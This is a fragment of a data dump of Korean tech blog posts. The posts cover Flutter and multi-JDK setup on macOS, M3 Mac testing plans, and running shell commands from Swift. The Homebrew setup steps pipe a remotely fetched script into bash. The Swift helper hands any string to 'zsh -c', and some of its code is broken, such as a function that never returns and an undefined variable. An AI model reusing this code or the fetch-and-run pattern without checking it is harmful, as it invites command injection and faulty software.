게시되었습니다.\n","ogImage":{"url":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png"},"coverImage":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png","tag":["Tech"],"readingTime":5},{"title":"맥용 플러터 설정하기","description":"","date":"2024-05-23 15:18","slug":"2024-05-23-SettingupFlutterforMacOS","content":"\n\n이 튜토리얼은 MacOS 기기에 플러터를 설치하는 방법을 안내해드립니다. 맥에서 플러터를 사용하는 장점은 안드로이드 및 iOS 앱을 모두 개발할 수 있는 능력입니다.\n\n# 단계\n\n- 다음 명령을 사용하여 터미널을 통해 플러터를 설치합니다:\n\n```js\nbrew install --cask flutter\n```\n\n<div class=\"content-ad\"></div>\n\n다트와 플러터를 \"/usr/local/bin\"에 설치할 것입니다.\n\n2. 설치를 확인하세요. 다음 명령을 사용하여 누락된 SDK 도구나 요구 사항이 있는지 확인할 수 있습니다.\n\n```js\nflutter doctor\n```\n\n만약 플러터, 다트 및 필요한 도구를 설치했다면 아래 표시된 이미지처럼 보일 것입니다. 초기에는 일부 도구가 누락될 수 있습니다. Step #3를 완료하면 확인 표시가 되어 있을 것입니다.\n\n<div class=\"content-ad\"></div>\n\n![image](/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png)\n\n3. Android 및 IOS 앱 개발에 필요한 도구 설치하기. 아래의 다음 섹션을 참조하세요.\n\n4. 선택한 IDE에 대한 확장 기능 설치하기.\n\n- Flutter 확장 기능이 포함된 Visual Studio Code 1.77 이상.\n- IntelliJ용 Flutter 플러그인이 포함된 Android Studio 2023.1(하지호그) 이상.\n- IntelliJ 및 Android 플러그인이 모두 포함된 IntelliJ IDEA 2023.1 이상.\n\n<div class=\"content-ad\"></div>\n\n# 안드로이드 개발을 위해\n\n- 브라우저를 통해 Android Studio를 다운로드하여 설치하세요.\n\n- 해당 링크로 이동하세요: https://developer.android.com/studio\n\n2. 설치한 후에 Android Studio의 SDK 매니저로 이동하세요.\n\n<div class=\"content-ad\"></div>\n\n3. SDK Tools 탭 아래로 이동하여 SDK 명령줄 도구를 활성화하세요. 적용 버튼을 눌러주세요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_1.png)\n\n4. 터미널로 돌아가서 라이센스를 수락하는 명령어를 실행하세요.\n\n```js\nflutter doctor --android-licenses\n```\n\n<div class=\"content-ad\"></div>\n\n5. Flutter doctor를 다시 실행하여 설정이 제대로 되었는지 확인해보세요.\n\n6. Android Emulator를 설정하세요.\n\n   - Android Emulator는 이미 Android Studio에 포함되어 있습니다. 필요한 것은 여기에 나와 있는 단계를 따르는 것 뿐입니다: macOS에서 Flutter Android 앱 빌드 시작하기\n\n   - 참고: 링크의 1단계에서 VM 가속기는 더 이상 MacOS에서 지원되지 않음을 유념해주세요.\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 안드로이드 에뮬레이터를 설정하면 구성에 따라 가상 안드로이드 장치가 표시됩니다. 이 에뮬레이터에서는 플러터 앱을 실행할 수 있어요.\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_2.png)\n\n# iOS 개발을 위해\n\n개발 도구를 설치하세요.\n\n<div class=\"content-ad\"></div>\n\n- Xcode (버전 15 이상) — 네이티브 Swift 또는 ObjectiveC 코드를 디버그하고 컴파일합니다.\n\na. MacBook에서 앱 스토어를 열고 Xcode를 검색하세요.\n\nb. 그런 다음 \"get\"과 \"install\" 버튼을 클릭하세요. 이 작업을 계속하려면 Apple ID로 로그인해야 합니다. 설치에는 시간이 소요될 수 있습니다.\n\nc. 터미널에서 이 라인을 실행하세요. 이렇게 하면 명령줄 도구가 설치된 Xcode 버전을 사용하도록 구성됩니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nsudo sh -c 'xcode-select -s /Applications/Xcode.app/Contents/Developer && xcodebuild -runFirstLaunch'\n```\n\n터미널에서 “agree”를 입력하라는 안내가 표시됩니다.\n\nc. 터미널에서 다음 줄을 실행하세요. xcode 라이선스 동의서에 서명하십시오.\n\n```js\nsudo xcodebuild -license\n```\n\n<div class=\"content-ad\"></div>\n\n터미널에서 \"동의\"를 입력하라는 프롬프트가 표시될 것입니다.\n\n2. 코코아팟 (1.13 또는 그 이상) - 네이티브 앱에서 플러터 플러그인을 컴파일하는 데 사용됩니다.\n\n  - 설치하려면 터미널에서 다음 줄을 실행하세요.\n\n```js\nsudo gem install cocoapods\n```\n\n<div class=\"content-ad\"></div>\n\n3. IOS 시뮬레이터 — 플러터 앱을 가상 IOS에서 표시합니다.\n\na. IOS 시뮬레이터 설치하기 — 시간이 걸릴 수 있습니다\n\n```js\nxcodebuild -downloadPlatform iOS\n```\n\nb. 시뮬레이터 실행하기\n\n<div class=\"content-ad\"></div>\n\n```js\nopen -a Simulator\n```\n\n심레이터를 실행하면 가상 아이폰이 표시되는 창 또는 팝업이 열립니다.\n\n<img src=\"/assets/img/2024-05-23-SettingupFlutterforMacOS_3.png\" />\n\n# 보너스:\n\n<div class=\"content-ad\"></div>\n\n디버그하는 방법을 알려드릴게요!\n\n- VSCode에서는 flutter 애플리케이션을 디버그하기 위해 개발자 도구로 이동할 수 있습니다. cmd + Shift + P를 누르고 \"Flutter: Open DevTools\"를 입력하면 디버깅에 사용할 수 있는 개발 도구 목록이 표시됩니다:\n\n![이미지](/assets/img/2024-05-23-SettingupFlutterforMacOS_4.png)\n\n출처:\n\n<div class=\"content-ad\"></div>\n\n- [https://docs.flutter.dev/get-started/install/macos](https://docs.flutter.dev/get-started/install/macos)","ogImage":{"url":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png"},"coverImage":"/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png","tag":["Tech"],"readingTime":4},{"title":"맥OS에서 여러 JDK를 설치하고 전환하는 방법","description":"","date":"2024-05-23 15:17","slug":"2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS","content":"\n![JDK installation on macOS](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png)\n\n모든 운영 체제에는 macOS를 포함한 사전 설치된 JDK가 없습니다. 이 게시물에서는 macOS에 여러 JDK를 수동으로 설치하고 관리하는 방법을 살펴보겠습니다.\n\nmacOS에서 소프트웨어를 설치하는 잘 알려진 과정은 앱 아이콘을 클릭하거나 앱 아이콘을 Applications 폴더로 끌어다 놓는 것입니다. 이는 모든 설치 세부 정보를 멋진 앱 아이콘과 진행중인 바 아래에 숨깁니다.\n\n그러나 우리 개발자들은 로그를 보고 명령줄 도구를 사용하는 것을 좋아합니다. 이를 위해 Linux 배포판은 yum이나 apt-get과 같은 패키지 관리자를 사용합니다. 그러나 모든 것이 Apple로 이어지듯이 가장 일반적인 무료 소프트웨어는 macOS에서 작동하지 않습니다. 여기서 HomeBrew가 구원의 역할을 합니다.\n\n<div class=\"content-ad\"></div>\n\n# HomeBrew\n\n도구의 홈페이지에 따르면,\n\n```js\nmacOS를 위한 누락 된 패키지 관리자입니다.\nHomebrew는 macOS에 포함되지 않은 UNIX 도구를 설치하는 가장 쉽고 유연한 방법입니다.\n```\n\nHomebrew를 사용하면 명령 줄을 통해 소프트웨어를 설치 할 수 있으며 로그에서 많은 설치 정보를 볼 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# Homebrew 설치하기\n\n맥OS에 Homebrew를 설치하려면 맥OS의 Terminal 또는 iTerm 애플리케이션을 열고 아래 명령어를 실행하세요.\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n이 작업이 완료되면 homebrew를 사용하여 사용 가능한 formulae 또는 cask를 한 줄로 설치할 수 있습니다. `brew install xxxx` 또는 `brew install --cask xxxx`와 같은 명령을 사용하세요.\n\n<div class=\"content-ad\"></div>\n\n# 다양한 JDK 버전 설치하기\n\n먼저, Homebrew를 사용하여 사용 가능한 Java 버전을 찾아보겠습니다. 다음 명령어를 사용해주세요.\n\n```bash\nbrew search --formulae java\n```\n\n아래에서 확인할 수 있듯이, java11과 java만 사용 가능합니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_1.png)\n\n<div class=\"content-ad\"></div>\n\n더 오래된 버전을 원하시면, openjdk.java 및 java11을 openjdk 및 openjdk@11의 별명으로 사용하여 검색할 수 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_2.png)\n\n이제 우리가 공식 이름을 알았으니, 하나의 명령어로 서로 다른 JDK를 설치할 수 있습니다. 최신 버전 및 java11을 설치해 보겠습니다.\n\n터미널 또는 iTerm에 다음 2개의 명령어를 차례대로 실행해 주세요.\n\n<div class=\"content-ad\"></div>\n\n```js\nbrew install openjdk\nbrew install openjdk@11\n```\n\n# 일부 수동 설정\n\n이제 우리 Mac에는 자바 17과 자바 11이 모두 설치되어 있습니다.\nMac 프로그램에서 어떤 것을 사용할지 확인해 보겠습니다.\n\n- 어떤 기기에서든 현재 자바 버전을 확인하는 가장 쉬운 방법은\n  java -version을 사용하는 것입니다.\n- macOS에 설치된 모든 자바 버전을 확인할 수도 있습니다. java_home /usr/libexec/java_home -V를 사용하세요.\n\n<div class=\"content-ad\"></div>\n\n그러나 위 2개의 명령어를 시도하면 다음 출력이 나옵니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_3.png\" />\n\n어떤 이유에서인지 macOS는 Homebrew로 설치한 Java를 감지하지 못합니다. 이것은 Homebrew를 사용하여 패키지를 설치할 때 매번 나타나는 문제입니다.\n\n- 패키지를 패키지 자체 디렉토리에 설치합니다.\n  M1-Mac의 경우 /opt/homebrew/Cellar에\n  Intel Mac의 경우 /usr/local/Cellar에\n- /opt/homebrew/opt 아래에 심볼릭 링크도 생성합니다.\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_4.png\" />\n\n하지만 *nix 시스템은 /usr/bin/java, /usr/lib/jvm 및 /usr/local/bin/java에서 Java를 찾습니다. Apple의 모든 것들과 마찬가지로 macOS는 다릅니다. Java를 /Library/Java/JavaVirtualMachines/에서 찾습니다.\n\n이러한 JDK 설치법은 /Library/Java/JavaVirtualMachines/ 폴더 아래 필요한 softlink를 설정할 수 있었을 것입니다. 그러나 디자인상 이러한 JDK 설치법은 keg-only로 유지됩니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_5.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n이 정보는 설치 로그에도 있습니다.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_6.png)\n\n따라서 Mac 프로그램에서 설치된 Java를 감지하려면 해당 폴더에 몇 가지 소프트 링크를 만들어야 합니다. 설치 로그에 제공된 명령을 그대로 복사하여 붙여넣으십시오.\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_7.png)\n\n<div class=\"content-ad\"></div>\n\n이 섹션의 시작 부분에서 실패한 명령을 실행하려고 하면 아래와 같은 출력이 나타납니다.\n\n<img src=\"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_8.png\" />\n\n이제 macOS에서 감지된 2개의 JDK를 설치했으므로 두 가지 간을 빠르게 전환하는 방법을 살펴보겠습니다.\n\nJava의 버전을 한 가지만 설치하는 경우에는 이미 끝났습니다. 그러나 Mac에 여러 가지 다른 버전의 Java를 설치하고자 하는 경우 위의 단계대로 각각 설치하고 아래 단계에 따라 그 사이를 전환할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# JDK 전환하기 (JAVA_HOME 및 java_home)\n\nJAVA_HOME은 Java 프로그램이 Java 위치를 선택하도록 하는 환경 변수입니다. 따라서 다양한 Java 버전 간에 전환하려면 JAVA_HOME 값을 다른 위치로 변경해야 합니다.\n\n또한 /usr/libexec/java_home 유틸리티가 있습니다. 이를 사용하여 다양한 버전 간에 전환합니다.\n\n우리의 설치에서는 다음과 같이 매개 변수 -v (소문자 v)가 우리에게 제공하는 내용입니다.\n\n<div class=\"content-ad\"></div>\n\n`\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_9.png)\n\n- 이 명령어의 출력을 활용하여 JAVA_HOME을 아래와 같이 설정할 수 있습니다.\nexport JAVA_HOME=`/usr/libexec/java_home -v 17`\n- 그러나 명령어를 입력하는 것이 조금 길 수 있습니다. 그래서 전체 명령어를 대체할 수 있는 한 단어의 별칭을 만들어 보겠습니다.\nalias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`”\n- 또한, 새 터미널을 열 때마다 이러한 별칭이 사용 가능하도록 해야 합니다. 이를 위해 ~/.zshrc 파일에 추가해야 합니다. ~/.zshrc 파일에 다음과 같이 2개의 별칭을 추가하세요. ~/.zshrc 파일이 존재하지 않는 경우, 파일을 생성하세요.\n\n```js\nalias java-17=”export JAVA_HOME=`/usr/libexec/java_home -v 17`; java -version”\nalias java-11=”export JAVA_HOME=`/usr/libexec/java_home -v 11`; java -version”\n```\n\n모두 완료되었습니다.\n원하는 때마다 터미널이나 iTerm에서 java-11 또는 java-17을 입력하세요.\n\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_10.png)\n\n# TL;DR (명령어 간단 요약)\n\n설명이 아닌 단계만 원하는 분들을 위해 간단한 단계를 안내합니다.\n\n- 시스템에 Homebrew가 없는 경우 Homebrew를 설치하세요.\n\n<div class=\"content-ad\"></div>\n\n```js\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n- Homebrew 및 openjdk를 사용하여 필요한 만큼 JDK를 설치하세요.\n\n```js\nbrew install openjdk@XX\n```\n\n- MAC에서 JDK에 액세스할 수 있도록 하려면, 소프트 링크나 실제 폴더를 /Library/Java/JavaVirtualMachines/에 추가하세요. 소프트 링크를 사용하려면 아래 명령어를 사용하세요.\n\n<div class=\"content-ad\"></div>\n\n\n$ sudo ln -sfn /opt/homebrew/opt/openjdkXXX/libexec/openjdkXXX.jdk /Library/Java/JavaVirtualMachines/openjdkXXX.jdk\n\n\n- Add one more alias under `~/.zshrc` to quickly switch between JDK\n\n\nalias java-XX=\"export JAVA_HOME=\\`/usr/libexec/java_home -v XX\\`; java -version\"\n\n","ogImage":{"url":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png"},"coverImage":"/assets/img/2024-05-23-InstallingswitchingbetweenmultipleJDKonmacOS_0.png","tag":["Tech"],"readingTime":6},{"title":"나의 새로운 M1 Mac을 위해 계획한 것","description":"","date":"2024-05-23 15:15","slug":"2024-05-23-WhatIHavePlannedforMyNewM3Macs","content":"\n\n![이미지](/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png)\n\n새로운 맥 주간이에요!\n\n새로운 M3 맥이 판매가 그리 좋지 않다는 제안에도 불구하고(대부분의 모델의 배송 예상일이 11월로 남아 있는 순수한 기반으로), 여러분 중 많은 분들이 이번 주에 문을 노크하는 걸 열심히 기다리고 계실 것 같아요.\n\n저는 두 대의 M3-탑재 맥을 기다리고 있어요. 첫 번째로는 현재 사용하지 않고 부끄럽게도 M1 버전을 대체할 M3 24인치 iMac 기본 모델이고 두 번째로는 M1 Max 16인치 MacBook Pro를 중고 시장으로 돌리게 될 M3 Max 14인치 MacBook Pro에요.\n\n<div class=\"content-ad\"></div>\n\n저는 이 두 대의 기계에 대한 계획을 가지고 있어요. 물론, 이들을 개봉하는 즉시 떠오르는 즉시 테스트가 있어요. 기대가 되는 결과를 빨리 볼 수 있을 테니까 말이에요. 또한, 제 기본적인 테스트가 여러분이 M3 플랫폼으로 업그레이드를 고려할 수 있도록 도와줄 것을 희망하고 있어요.\n\n제가 설명해 드릴게요.\n\n## 내 M3 iMac 테스트\n\n특정한 맥으로 선정한 정책이 있어요. 베이스 모델 버전만 구매한다는 거죠.\n\n<div class=\"content-ad\"></div>\n\n맥북 에어는 그중 하나입니다. 내 의심은 굉장히 매력적이지만 상당히 비싼 컴퓨터들이기 때문에 많은 사람들이 그냥 제일 싼 것을 선택하는 것 같다는 점입니다. 그래서 나에게는 바로 기본 모델 구매자들이 돈을 주고 무슨 성능을 얻는지 정확히 알아보는 것이 내 임무인 것 같습니다.\n\n나는 2021년에 24인치 iMac 리프레시에 대해 동일한 방식을 취했습니다. M1의 기본 구성을 넘어서지 않고, 첫 번째 옵션을 가방에 넣어 체크아웃을 했습니다. 그렇게 해서 나는 8GB의 통합 메모리, 7코어 GPU 및 256GB의 SSD 저장 공간을 갖춘 맥을 얻게 되었습니다. 그 확인된 M1 머신들과 마찬가지로, 그 돈에 걸맞는 성능을 발휘하여 즉시 인기를 끈 컴퓨터가 되었습니다.\n\n따라서 그 후속 모델은 상당히 성능을 유지해야 할 것이고, 나는 그것을 구매하는 방식이 이전과 동일했습니다. 이번에는 그래픽 코어 수의 한자리 숫자 증가 및 M1에서 M3로의 전환이 유일한 차이점입니다.\n\n문제는 다년간 애플의 올인원 제품에 대한 업데이트가 없었던 900일 이상을 거쳐 M2 칩이 거부당했고 완전히 손대지 않은 채로 진열대에 방치된 이 기계에 대해 얼마나 큰 발전을 이뤘는지입니다. 기억해야 할 점은 이 기계가 M2칩을 거부당하고 완전히 소홀히 처리되었다고 여겨진 기계라는 것입니다.\n\n<div class=\"content-ad\"></div>\n\n우리가 온만큼 멀리 왔을까요?\n\n내 시험은 여느 때처럼 간단하고 대충한 테스트일 것입니다. 나는 내 Sony FX3 카메라로 10분짜리 4K 영상을 촬영하고, Final Cut Pro에 넣어 부드러운 컬러 그레이드를 주고, 두 가지 루틴을 수행할 것입니다 - 렌더링과 익스포트. 이 작업은 M1 iMac에서, M3 iMac에서, 그리고 내 예전 27인치 인텔 기반 iMac에서 수행할 것입니다.\n\n기본 모델인 M3 iMac이 앞세대 제품들보다 얼마나 빠를지 궁금합니다. 정말로 기대되네요 (비디오를 놓치지 않으려면 제 유튜브 채널을 구독하기를 잊지 마세요)!\n\n<div class=\"content-ad\"></div>\n\n## 내 M3 Max MacBook Pro 테스트\n\n나는 내 M3 14인치 MacBook Pro 주문을 잘못한 것 같아.\n\n애플의 '무서운 속도' 이벤트를 지난 달 졸지에 커버하면서 새로운 프로덕션 랩탑을 사양을 빨리 정하고 주문해야 했어. 불행히도 이 일은 늦은 일이었고(이벤트가 영국 시간으로 자정에 방영되었음), 내 머리를 충분히 쓰지 않았던 것 같아.\n\n내가 현재 문이 오는 사양(그러나 Apple 주문 추적기에 따르면 현재 \"지연\"되었음)은 M3 Max 칩을 완전히 최대로 활성화하여 16코어 CPU와 40코어 GPU, 2TB의 SSD 저장 공간, 그리고 48GB의 통합 메모리를 포함하고 있어.\n\n<div class=\"content-ad\"></div>\n\n제가 실수한 부분은 후자와 관련이 있다고 생각합니다. 추가 200 파운드를 더 지불하면 사랑스러운 Space Black 노트북을 64GB의 통합 메모리로 구성할 수 있었을 텐데요. 이미 이 새로운 기계에 4,000 파운드 이상을 들였기 때문에 그것은 이제 무난한 선택처럼 느껴집니다. 결국 이건 이제 목돈이니까요.\n\n그래서 곧 도착하는 구성을 반품하고 64GB 버전을 다시 주문할 가능성이 매우 높습니다. 교훈을 얻었네요. 하지만 Apple의 관대한 반품 정책을 활용해서 그 사랑스러운 Space Black 색상을 조심스럽게 개봉하고 빠른 Mark Ellis Reviews 테스트를 해볼 거에요.\n\n이 테스트는 iMac의 것보다 더 복잡하지 않을 것이지만 결과는 마땅히 빛날 것입니다. 이전에 언급한 대로, 내가 콘텐츠 크리에이터이자 Apple 제품에 대해 다루는 일을 하는 사람이 아니었다면 이 새로운 MacBook Pro를 살 일은 없었을 테니까요 — 내 M1 Max 16인치 MacBook Pro는 여전히 절대적인 성능을 보여주고 있습니다.\n\n그렇다면 이 굉장히 중요한 질문이 생깁니다: M1 Max에서 M3 Max로 전환했을 때 어떤 이득을 얻을 수 있을까요? 이 방대한 비용을 정당화할 만한 가치가 있는지에 대한 의견은 무엇인가요? 일반적으로 최신 Apple 실리콘 패밀리의 Max 버전은 최근 두 세대에서 가장 놀라운 진보를 보여주고 있다는 평이 있습니다. 실제로 일상에서 어떤 변화가 있는지 확인해보고 싶습니다.\n\n<div class=\"content-ad\"></div>\n\n그래서, 이 두 대의 머신 사이에서 똑같은 Final Cut Pro 테스트를 할 거에요. 렌더링 및 내보내기 과정에서 몇 초(아니면 분?!)를 단축할 수 있을까요? 비디오 편집자는 여러분께 말씀드립니다. 프로젝트를 빠르게 완료할 수 있는 속도가 여러분의 생계에 달려 있다면, 그 몇 초가 의미심장하다는 것을요. 우리 모두가 애플에게 가장 궁금한 점은 이 하드웨어에 상당한 투자를 한 만큼, 우리가 그 몇 초를 얻게 되는지입니다.\n\n솔직히 이 맥북 프로는 매우 비싼 머신들이라는 사실을 인정해야 합니다.\n\n## 마무리\n\n내 테스트가 주로 비디오 제작에 중점을 두고 있다는 것과 새로운 맥을 위한 모든 사람들의 사용 사례가 아니라는 것을 알고 있습니다.\n\n<div class=\"content-ad\"></div>\n\n그러므로 시각 콘텐츠를 다루지 않는 경우, 내 시험 결과는 다소 주의해서 받아들여야 할 것 같아요. 다행히도 다른 리뷰어들로부터 더 심층적인 테스트가 다음 몇 주 동안 등장할 예정이며, 그들이 무엇을 발견했는지 — 이것이 M3 세대에 어떤 의미를 갖는지 기대되네요.\n\n하지만 이제는 당신에게 차례입니다 — 어떤 M3 Mac이 당신의 쇼핑 목록에 있는지, 그리고 당신은 그것을 어떻게 활용할 계획인가요? 아래에서 참여해주세요!\n\n## 떠나기 전에\n\n기술 콘텐츠 제작자의 주간 비하인드 더 시즌 비디오를 보기 위해 내 뉴스레터 목록에 가입하세요!\n\n<div class=\"content-ad\"></div>\n\nhttps://markellisreviews.com에서 2023년 11월 7일에 원래 발행되었습니다.","ogImage":{"url":"/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png"},"coverImage":"/assets/img/2024-05-23-WhatIHavePlannedforMyNewM3Macs_0.png","tag":["Tech"],"readingTime":4},{"title":"스위프트로 터미널 프로그램 실행하기","description":"","date":"2024-05-23 15:14","slug":"2024-05-23-RunningTerminalProgramsfromSwift","content":"\n스위프트와 명령 줄을 통합하면 개발자가 스위프트 애플리케이션 내에서 쉘 명령어의 기능을 활용할 수 있습니다. 이 기능은 주로 작업 자동화, 스크립트 실행 또는 시스템 수준 기능에 직접 액세스하는 데 유용합니다. 이 기사에서는 실용적인 예제를 사용하여 스위프트에서 터미널 프로그램을 실행하는 방법을 살펴보겠습니다.\n\n# 종속성 가져오기\n\n프로세스 실행에는 Foundation 라이브러리가 필요합니다.\n\n```js\nimport Foundation\n```\n\n<div class=\"content-ad\"></div>\n\nFoundation 라이브러리는 애플의 개발 생태계의 핵심 부분으로, 필수적인 데이터 유형, 컬렉션 및 운영 체제 서비스를 제공하여 날짜, 시간 및 프로세스와 같은 작업을 관리합니다. Foundation을 사용하여 프로세스를 실행하면 시스템의 명령 줄과 상호 작용하기 위한 강력하고 테스트된 API를 활용할 수 있습니다.\n\n# 프로세스 실행\n\nSwift에서 터미널 애플리케이션을 실행하는 것은 본질적으로 직접 프로그램을 실행하는 대신 zsh와 같은 쉘에서 명령 줄 프로그램을 실행해야 한다는 것을 의미합니다.\n\n따라서 다른 프로그램을 실행하도록 지시하는 /bin/zsh를 실행해야 합니다. 여러분은 bash 스크립트에서처럼 유사한 개념인 #!/bin/bash를 알고 있을 수 있습니다. 이는 “bash를 사용하여 이 프로그램을 실행”을 의미합니다. 이는 터미널과 상호 작용하는 이진 프로그램에 대한 비슷한 개념입니다.\n\n<div class=\"content-ad\"></div>\n\n본질적으로, 우리는 환경 변수를 전달하여 터미널 프로그램을 실행하도록 Swift에 지시할 것입니다 (예: PATH=/usr/bin, 실행 쉘(예: /bin/zsh), 그리고 실행할 프로그램 및 옵션을 포함한 내용(예: ls ~)):\n\n![Running Terminal Programs from Swift](/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_0.png)\n\n## 1. 프로세스 설정하기\n\n우선, Process의 인스턴스를 생성합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nlet process = Process()\n```\n\nShell 명령어의 실행은 Process 인스턴스에서 처리되며, 출력과 에러 스트림은 Pipe 인스턴스가 캡처합니다.\n\n## 2. Process 구성\n\n다음으로, 인수와 사용할 쉘을 정의합니다. 우리는 zsh 쉘에 명령을 실행하도록 지시할 것이므로, 프로세스의 launchPath를 /bin/zsh로 설정하고 프로그램 및 인수를 쉘의 인수로 -c `프로그램 및 인수`를 전달할 것입니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nlet command = \"ls ~\"\nprocess.launchPath = \"/bin/zsh\" // 또는 \"/bin/bash\" 당신의 셸에 따라 다름\nprocess.arguments = [\"-c\", command]\n```\n\n-c 인자는 쉘이 명령어 문자열을 실행하도록 지시합니다. command는 예를 들어 ls ~나 echo \"Hello world\"와 같은 표준 프로그램 실행을 나타내는 문자열일 수 있습니다.\n\n일부 프로그램은 MacOS의 보안 제약으로 인해 실행할 수 없습니다. 예를 들어, Swift 프로그램에서 /bin/ps를 실행할 수 없는 이유는 특정 보안 제약을 위반하기 때문입니다.\n\n많은 프로그램은 환경 변수가 설정되어야 합니다. 예를 들어, 프로그램이 다른 프로그램을 찾기 위해 PATH 환경 변수에 의존하는 것이 일반적입니다.\n\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경해주세요.\n\n```js\nlet environment = [\n  \"TERM\": \"xterm\",\n  \"HOME\": \"/Users/example-user/\",\n  \"PATH\": \"/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n]\nprocess.environment = environment\n```\n\n터미널에서 env를 실행하여 시스템 환경 변수를 실행 중에 확인할 수 있습니다.\n\n<img src=\"/assets/img/2024-05-23-RunningTerminalProgramsfromSwift_1.png\" />\n\n<div class=\"content-ad\"></div>\n\n## 3. 프로세스 실행하기\n\n그런 다음 macOS 버전을 확인하여 Foundation 라이브러리와의 호환성을 보장한 후 프로세스를 실행합니다:\n\n```js\nif #available(macOS 13.0, *) {\n    try! process.run()\n} else {\n    process.launch()\n}\n```\n\nmacOS 13용 Foundation에서는 응용 프로그램 실행 중 예기치 않은 오류가 발생하면 오류를 throw하는 기능이 도입되었고 .launch() 메서드는 사용이 중단되었습니다. 이러한 이유로 macOS 버전이 13 이상인지 테스트하고 .run() 메서드를 시도하고 이전 버전의 경우 .launch() 메서드로 넘어갈 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n에러를 잡아내는 것은 사용자나 개발자가 앱이 올바르게 작동하지 않음을 알 수 있는 가장 좋은 방법입니다.\n\n# 출력 및 에러 잡기\n\n출력을 잡기 위해서는 Pipe를 만들고, 이를 프로세스의 출력에 연결해야 합니다.\n\n```js\nlet pipe = Pipe();\nprocess.standardOutput = pipe;\nprocess.standardError = pipe;\n```\n\n<div class=\"content-ad\"></div>\n\n프로세스가 완료되면, pipe는 프로세스 응답을 바이너리 배열로 수집할 것입니다. 대부분의 터미널 출력은 사람이 읽을 수 있는 텍스트이므로 UTF-8로 인코딩된 문자열로 변환할 수 있습니다:\n\n```js\nlet data = pipe.fileHandleForReading.readDataToEndOfFile()\nlet output = String(data: data, encoding: .utf8) ?? \"\"\n```\n\n## 모두 함께 넣기\n\n이러한 개념들을 결합하여, 터미널 명령을 실행하고 결과를 반환하는 함수를 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```swift\nfunc executeProcessAndReturnResult(_ command: String) -> String {\n  let process = Process()\n  let pipe = Pipe()\n  let environment = [\n    \"TERM\": \"xterm\",\n    \"HOME\": \"/Users/example-user/\",\n    \"PATH\": \"/opt/homebrew/bin:/opt/homebrew/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n  ]\n  process.standardOutput = pipe\n  process.standardError = pipe\n  process.environment = environment\n  process.launchPath = \"/bin/zsh\"\n  process.arguments = [\"-c\", command]\n  if #available(macOS 13.0, *) {\n    try! process.run()\n  } else {\n    process.launch()\n  }\n  let data = pipe.fileHandleForReading.readDataToEndOfFile()\n  let output = String(data: data, encoding: .utf8) ?? \"\"\n  return output\n}\n```\n\n따라서 다른 프로그램에서 이러한 함수를 호출할 수 있습니다. 예를 들어 사용자의 홈 폴더에있는 폴더를 나열하는 프로그램에서 ls ~을 사용하여 호출할 수 있습니다:\n\n```swift\nlet response = executeProcessAndReturnResult(\"ls ~\")\nprint(response)\n// Desktop Documents Downloads Library Movies Pictures Public\n```\n\n# 데몬 프로세스 시작하기\n\n\n<div class=\"content-ad\"></div>\n\n긴 시간이 걸리는 프로세스, 예를 들어 데몬(daemon) 같은 것을 시작하고 주 스레드와 바인딩을 해제하려면, 프로세스를 실행하기 전에 \"불확정 상태\"로 설정합니다:\n\n```js\n// ... let process = Process()\nprocess.unbind(.isIndeterminate)\n// ... process.run()\n```\n\n이렇게 하면 프로세스가 독립적으로 계속 실행되지만, 앱에서 출력을 캡처하는 것이 더 어려워집니다.\n\n이러한 개념을 결합하여 터미널 명령어를 실행하고 출력을 반환하는 함수를 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```swift\nfunc executeDaemonProcess(_ command: String) -> String {\n  let process = Process()\n  process.environment = environment\n  process.launchPath = \"/bin/zsh\"\n  process.arguments = [\"-c\", command]\n  process.qualityOfService = .background\n  if #available(macOS 13.0, *) {\n    try! process.run()\n  } else {\n    process.launch()\n  }\n}\n```\n\n그래서 